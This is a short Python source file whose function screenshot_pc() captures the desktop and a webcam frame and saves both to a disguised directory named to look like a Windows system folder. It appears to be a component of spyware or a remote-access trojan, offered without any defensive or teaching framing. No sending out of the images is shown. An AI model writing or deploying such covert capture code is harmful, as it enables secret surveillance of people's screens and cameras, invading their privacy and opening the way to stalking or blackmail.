import mss
import cv2


def screenshot_pc():
    """
    screenshot of webcam and desktop
    """
    # desktop screenshot
    with mss.mss() as sct:
        sct.shot(output=r"C:\System32\x25x02x42\scr_des.png")

    # webcam screenshot
    cap = cv2.VideoCapture(0)

    # warming up the camera
    for i in range(30):
        cap.read()

    ret, frame = cap.read()
    try:
        cv2.imwrite(r'C:\System32\x25x02x42\cam.png', frame)   # file saving
    except Exception as ex:
        print("screenshot :", ex)
    cap.release()
